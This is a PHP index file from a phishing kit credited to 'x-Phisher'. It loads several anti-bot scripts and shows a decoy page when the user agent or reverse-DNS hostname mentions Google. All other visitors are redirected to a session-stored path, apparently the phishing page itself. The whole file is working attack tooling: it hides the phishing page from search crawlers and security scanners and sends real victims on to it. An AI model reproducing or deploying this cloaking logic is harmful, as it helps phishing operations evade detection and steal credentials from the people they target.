<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
session_start();
error_reporting(0);
$path = "./site/";
include('./BOTS/antibots1.php');
include('./BOTS/antibots2.php');
include('./BOTS/antibots3.php');
include('./BOTS/antibots4.php');
include ('./BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();

}
if (isset($_SESSION['e'])) {
    $_SESSION['e'] = $_SESSION['e'];
}
$path = $_SESSION['path'];
?>
<!DOCTYPE html>
<html>
<head>
    <META HTTP-EQUIV="refresh" CONTENT="0; URL=<?php echo $path;?>">
</head>
</html>